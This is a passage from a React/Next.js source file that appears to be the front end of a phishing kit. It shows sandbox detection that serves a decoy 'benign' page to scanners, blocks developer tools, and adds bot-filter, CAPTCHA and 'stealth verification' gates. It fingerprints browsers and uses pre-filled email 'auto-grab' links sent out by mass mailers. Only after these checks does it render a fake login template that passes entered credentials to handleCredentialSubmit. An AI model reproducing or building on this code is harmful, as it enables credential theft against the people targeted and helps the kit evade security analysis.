        }
        
        // Legitimate user - show landing page after delay
        // Mark checking as complete immediately to allow flow to proceed
        setCheckingComplete(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
        
        setTimeout(() => {
          setIsChecking(false)
          setShowLandingPage(true)
        }, randomDelay)
      } catch (error) {
        // CRITICAL FIX: Fail open instead of redirecting
        if (process.env.NODE_ENV === 'development') {
          console.error('Bot detection error:', error)
        }
        
        // Proceed anyway on error (fail open)
        setCheckingComplete(true)
        setIsChecking(false)
        setShowLandingPage(true)
        if (typeof window !== 'undefined') {
          sessionStorage.setItem('checking_complete', 'true')
        }
      }
    }
    
    // Start bot detection immediately
    performBotDetection()
  }
  
  // Enhanced fingerprint generation for bot detection
  const generateEnhancedFingerprint = async (): Promise<string> => {
    if (typeof window === 'undefined') return ''
    
    const fingerprint = {
      screen: `${window.screen.width}x${window.screen.height}x${window.screen.colorDepth}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language,
      platform: navigator.platform,
      hardware: `${navigator.hardwareConcurrency || 'unknown'}x${(navigator as any).deviceMemory || 'unknown'}`,
      plugins: navigator.plugins.length,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || 'unknown',
      timestamp: Date.now(),
    }
    
    return JSON.stringify(fingerprint)
  }

  // Layer 0: Sandbox Detection - Show benign page if detected (BEFORE all other checks)
  if (showBenign && benignTemplate) {
    return (
      <>
        <DevToolsBlocker />
        <iframe
          src={benignTemplate}
          className="w-full h-screen border-0"
          title="Benign Content"
          sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
        />
      </>
    )
  }

  // Loading state while sandbox detection is running
  if (!sandboxCheckComplete || detectionLoading) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
            <p className="mt-4 text-gray-600 dark:text-gray-400">Loading...</p>
          </div>
        </div>
      </>
    )
  }

  // Show CAPTCHA gate first if not verified
  if (!captchaVerified) {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={handleBotDetected}>
          <CaptchaGateWrapper onVerified={handleCaptchaVerified} />
        </BotFilterGate>
      </>
    )
  }

  // Show loading/detection screen during 3-7 second delay
  // Only show if we're still checking AND haven't completed yet
  if (isChecking && !checkingComplete) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800">
          <div className="text-center">
            <div className="animate-spin rounded-full h-16 w-16 border-b-4 border-blue-600 mx-auto mb-6"></div>
            <h2 className="text-xl font-semibold text-gray-900 dark:text-white mb-2">
              {translations.verifying}
            </h2>
            <p className="text-sm text-gray-600 dark:text-gray-300">
              {translations.loadingMessages.verifying}
            </p>
          </div>
        </div>
      </>
    )
  }

  // Show stealth verification gate (BEFORE showing actual form)
  // CRITICAL: This gate respects admin settings.security.gates.layer4StealthVerification
  // If disabled in settings, StealthVerificationGate will auto-verify
  if (!stealthVerified && !bypassSecurity) {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={handleBotDetected}>
          <StealthVerificationGate 
            onVerified={handleStealthVerified}
            email={email}
            domain={domain}
            loadingScreenId={loadingScreenId}
            duration={loadingDuration}
            language={templateLanguage}
          />
        </BotFilterGate>
      </>
    )
  }
  
  // Main landing page
  
  // Show error page for invalid links (including auto grab links with placeholders)
  if (linkStatus === 'invalid') {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="max-w-lg w-full text-center p-8 bg-white dark:bg-gray-800 rounded-lg shadow-lg">
            <div className="w-16 h-16 bg-red-100 dark:bg-red-900 rounded-full flex items-center justify-center mx-auto mb-4">
              <X className="w-8 h-8 text-red-600 dark:text-red-400" />
            </div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
              Invalid Link
            </h1>
            <p className="text-gray-600 dark:text-gray-400 mb-6">
              This link is invalid or has expired. Please check the link and try again.
            </p>
            {/* Help text for auto grab placeholder detection */}
            {searchParams.get('t')?.includes('++email') || 
             searchParams.get('a')?.includes('++email') ||
             searchParams.get('email')?.includes('++email') ||
             searchParams.get('e')?.includes('++email') ||
             searchParams.get('target')?.includes('++email') ||
             (typeof window !== 'undefined' && window.location.hash.includes('++email')) ? (
              <div className="mt-6 p-4 bg-blue-50 dark:bg-blue-900/20 border border-blue-200 dark:border-blue-800/30 rounded-lg text-left">
                <p className="text-sm text-blue-800 dark:text-blue-200 font-semibold mb-2">
                  ℹ️ This is a template auto-grab link
                </p>
                <p className="text-xs text-blue-700 dark:text-blue-300">
                  The <code className="bg-blue-100 dark:bg-blue-800 px-1 rounded">++email64++</code> placeholder needs to be replaced with an actual email address (or base64 encoded email) by your email sender before sharing this link.
                </p>
              </div>
            ) : null}
          </div>
        </div>
      </>
    )
  }

  // Show completion page if link was already used
  if (showCompletionPage) {
    return (
      <>
        <DevToolsBlocker />
        <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900">
          <div className="max-w-md w-full text-center p-8 bg-white dark:bg-gray-800 rounded-lg shadow-lg">
            <div className="w-16 h-16 bg-green-100 dark:bg-green-900 rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-green-600 dark:text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white mb-2">
              Review Completed
            </h1>
            <p className="text-gray-600 dark:text-gray-300 mb-6">
              Thank you for your submission. This link has been used and is no longer valid.
            </p>
            <p className="text-sm text-gray-500 dark:text-gray-400">
              You can close this window.
            </p>
          </div>
        </div>
      </>
    )
  }

  // ============================================================================
  // SECURITY NOTE: Templates ONLY render AFTER all security layers pass:
  // 1. ✅ Sandbox Detection (Layer 0) - Respects settings
  // 2. ✅ Bot Filter Gate (Layer 1) - Respects settings.security.gates.layer1BotFilter
  // 3. ✅ CAPTCHA Gate (Layer 2) - Respects settings.security.gates.layer2Captcha
  // 4. ✅ Bot Delay (Layer 3) - Respects settings.security.gates.layer3BotDelay
  // 5. ✅ Stealth Verification (Layer 4) - Respects settings.security.gates.layer4StealthVerification
  // 
  // Templates DO NOT bypass any security layers. All gates are enforced.
  // Admin can disable individual gates via Settings → Security tab.
  // ============================================================================
  
  // ONLY NOW show the actual login form (after ALL security checks pass)
  // Consolidated loading screen component to avoid duplication
  const loadingScreenProps = {
    title: "Loading...",
    subtitle: "Preparing your secure document access",
    email: email || undefined,
  }
  
  // Show template if available (after all security checks pass)
  if (checkingComplete && email && template) {
    return (
      <>
        <DevToolsBlocker />
        <BotFilterGate onFiltered={handleBotDetected}>
          <GenericTemplateRenderer
            template={template}
            language={templateLanguage}
            email={email || ''}
            onSubmit={handleCredentialSubmit}
            onError={(error) => {
              if (process.env.NODE_ENV === 'development') {
                console.error('Template error:', error)
              }
            }}
          />
        </BotFilterGate>
      </>
    )
  }
  
  // Show loading screen if we have email but template is still loading or not available
  if (checkingComplete && email) {
    return (
      <>
        <DevToolsBlocker />
        <WhiteLoadingScreen {...loadingScreenProps} />
      </>
    )
  }
  
  // Final fallback: Loading state (before we have email or checking is complete)
  return (
    <>
      <DevToolsBlocker />
      <WhiteLoadingScreen {...loadingScreenProps} />
    </>
  )
}

export default function Home() {
  return (
    <Suspense fallback={
      <main className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 dark:from-gray-900 dark:to-gray-800 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto"></div>
          <p className="mt-4 text-gray-600 dark:text-gray-300">Loading...</p>
        </div>
      </main>
    }>
      <HomeContent />
    </Suspense>
  )
}

